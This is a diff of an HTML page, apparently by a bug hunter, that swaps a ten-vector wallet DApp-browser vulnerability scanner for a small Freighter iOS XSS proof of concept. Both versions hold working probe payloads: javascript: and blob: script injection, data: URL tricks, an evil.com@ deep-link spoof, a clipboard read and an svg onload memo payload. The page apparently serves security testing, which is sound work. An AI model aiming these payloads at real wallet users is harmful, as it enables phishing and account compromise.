@@ -1,67 +1,18 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>DApp Browser Bug Scanner V2 - 0x403for</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@600;700&display=swap');
-:root{--p:#7B61FF;--g:#00ff88;--r:#ff3355;--bg:#0a0a0a;--c:#151515;--b:#222}
-*{box-sizing:border-box;margin:0;padding:0}body{background:var(--bg);color:#fff;font-family:Inter;padding:16px}
-.mono{font-family:'JetBrains Mono',monospace}.hdr{border:1px solid var(--b);border-radius:20px;padding:20px;background:linear-gradient(135deg,#15131f,#111);margin-bottom:14px}
-.badge{background:var(--p);padding:4px 10px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:0.12em}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}
-.card{background:var(--c);border:1px solid var(--b);border-radius:14px;padding:14px;position:relative}
-.card.fail{border-color:var(--r);background:rgba(255,51,85,0.06)}.card.pass{border-color:rgba(0,255,136,0.3)}
-.pill{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700}
-.pill.fail{background:var(--r);color:#fff}.pill.pass{background:var(--g);color:#000}.pill.wait{background:#333;color:#999}
-.tt{font-family:'JetBrains Mono';font-size:12px;font-weight:700;margin:8px 0 4px}.de{font-family:'JetBrains Mono';font-size:10px;opacity:0.6;line-height:1.4;word-break:break-all}
-.sev{position:absolute;top:10px;right:10px;font-size:8px;opacity:0.5}.btn{width:100%;height:44px;border-radius:22px;border:none;background:#fff;color:#000;font-family:'JetBrains Mono';font-weight:700;margin-top:14px}
-a{color:var(--p)}
-</style>
+<title>Freighter XSS PoC - 0x403for</title>
 </head>
-<body>
-<div class="hdr">
-  <div class="mono" style="font-size:18px;font-weight:700">DAPP BROWSER SCANNER V2 <span class="badge">0x403for</span></div>
-  <div class="mono" style="font-size:10px;opacity:0.5;margin-top:4px">10 vectors - Freighter / Rabby / Trust / Phantom - Safe PoC</div>
-  <div class="mono" style="display:flex;gap:8px;margin-top:12px;font-size:10px"><span id="f" style="color:var(--r)">FAIL:0</span><span id="p" style="color:var(--g)">PASS:0</span><span id="w">WAIT:0</span></div>
-</div>
-<div class="grid" id="grid"></div>
-<button class="btn mono" onclick="copy()">COPY REPORT</button>
-
-<script>
-const tests=[
-{id:'01',n:'about:blank UXSS',s:'Critical',d:'window.open about:blank inherit freighterApi'},
-{id:'02',n:'Provider Race Lock',s:'Critical',d:'defineProperty freighterApi before inject'},
-{id:'03',n:'data: URI Bypass',s:'Critical',d:'data:text/html vs javascript: block'},
-{id:'04',n:'blob: URL Bypass',s:'Critical',d:'createObjectURL HTML'},
-{id:'05',n:'Deep Link Spoof @',s:'High',d:'freighter://dapp/https://evil.com@aqua.network'},
-{id:'06',n:'localStorage Leak',s:'High',d:'cross-tab read'},
-{id:'07',n:'postMessage *',s:'Medium',d:'iframe aqua.network wildcard'},
-{id:'08',n:'Clipboard Auto Read',s:'Medium',d:'navigator.clipboard.readText()'},
-{id:'09',n:'Memo XSS Stellar',s:'High',d:'memo <svg onload> in history'},
-{id:'10',n:'File Download file://',s:'High',d:'download attr data: URL'},
-];
-const grid=document.getElementById('grid');
-tests.forEach(t=>{
-  const e=document.createElement('div'); e.id='c-'+t.id; e.className='card';
-  e.innerHTML=`<div class="sev mono">${t.s}</div><div class="pill wait mono" id="p-${t.id}">WAIT</div><div class="tt mono">${t.id} ${t.n}</div><div class="de mono" id="d-${t.id}">${t.d}</div>`;
-  grid.appendChild(e);
-});
-function set(id,st,de){ document.getElementById('c-'+id).className='card '+st; document.getElementById('p-'+id).className='pill '+st+' mono'; document.getElementById('p-'+id).innerText=st.toUpperCase(); document.getElementById('d-'+id).innerHTML=de; document.getElementById('f').innerText='FAIL:'+document.querySelectorAll('.card.fail').length; document.getElementById('p').innerText='PASS:'+document.querySelectorAll('.card.pass').length; document.getElementById('w').innerText='WAIT:'+document.querySelectorAll('.card.wait').length; }
-(async()=>{
-try{ let w=window.open('about:blank','_blank'); if(w){ try{ w.document.write('<script>alert("01 FAIL: about:blank inherit")<\/script>'); set('01','fail','VULN: about:blank bisa di-write'); setTimeout(()=>w.close(),2000);}catch(e){ set('01','pass','SECURE: '+e.message.slice(0,20)); w.close(); } } else set('01','pass','SECURE: popup blocked'); }catch(e){ set('01','pass','SECURE'); }
-try{ Object.defineProperty(window,'freighterApi',{value:{fake:true}}); set('02',window.freighterApi?.fake?'fail':'pass',window.freighterApi?.fake?'VULN: Bisa lock fake':'SECURE'); }catch(e){ set('02','pass','SECURE'); }
-try{ const a=document.createElement('a'); a.href='data:text/html,<script>alert(1)</script>'; set('03',a.href.startsWith('data:')?'fail':'pass',a.href.startsWith('data:')?`VULN: <a href="${a.href}" target="_blank">open data:</a>`:'SECURE'); }catch(e){ set('03','pass','SECURE'); }
-try{ const b=new Blob(['<h1>blob</h1>'],{type:'text/html'}); const u=URL.createObjectURL(b); set('04','fail',`VULN: blob: <a href="${u}" target="_blank">open blob</a>`); }catch(e){ set('04','pass','SECURE'); }
-set('05','wait',`MANUAL: <a href="freighter://dapp/https://0x403for.github.io@aqua.network">freighter://dapp/@ spoof</a>`);
-try{ localStorage.setItem('0x403for','PWNED'); set('06','wait',`WAIT: Set PWNED. Buka aqua.network tab baru, ketik javascript:alert(localStorage.getItem('0x403for'))`); }catch(e){ set('06','pass','SECURE'); }
-set('07','wait','MANUAL: iframe aqua.network + postMessage *');
-try{ navigator.clipboard.readText().then(t=>set('08','fail','VULN: '+t.slice(0,20))).catch(e=>set('08','pass','SECURE: need gesture')); }catch(e){ set('08','pass','SECURE'); }
-set('09','wait','MANUAL: Kirim memo <svg/onload=alert(1)> ke diri sendiri, buka Activity');
-set('10','wait',`<a href="data:text/html,evil" download="test.html" style="color:#7B61FF">Download test</a>`);
-})();
-function copy(){ let md='# DApp Scanner V2\n'; document.querySelectorAll('.card.fail').forEach(c=>md+=c.innerText+'\n'); navigator.clipboard.writeText(md); alert('Copied!'); }
-</script>
+<body style="background:#0a0a0a;color:#fff;font-family:monospace;text-align:center;padding-top:80px">
+<h2>Freighter iOS - javascript: PoC</h2>
+<p>Tap link dibawah - jika muncul alert 1 = VULN</p>
+<br><br>
+<a href="javascript:alert(1)" style="background:#7B61FF;color:#fff;padding:16px 32px;border-radius:12px;text-decoration:none;font-weight:700">CLICK ME - javascript:alert(1)</a>
+<br><br><br>
+<a href="javascript:alert('freighterApi:'+typeof window.freighterApi+'\nurl:'+location.href)" style="background:#222;color:#fff;padding:12px 20px;border-radius:10px;text-decoration:none;font-size:12px">TEST freighterApi exists</a>
+<br><br><br>
+<button onclick="const b=new Blob(['<script>alert(`blob: freighterApi=${typeof freighterApi}`)</script>'],{type:'text/html'}); location.href=URL.createObjectURL(b)" style="background:#ff3355;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-weight:700">TEST blob: bypass</button>
 </body>
 </html>
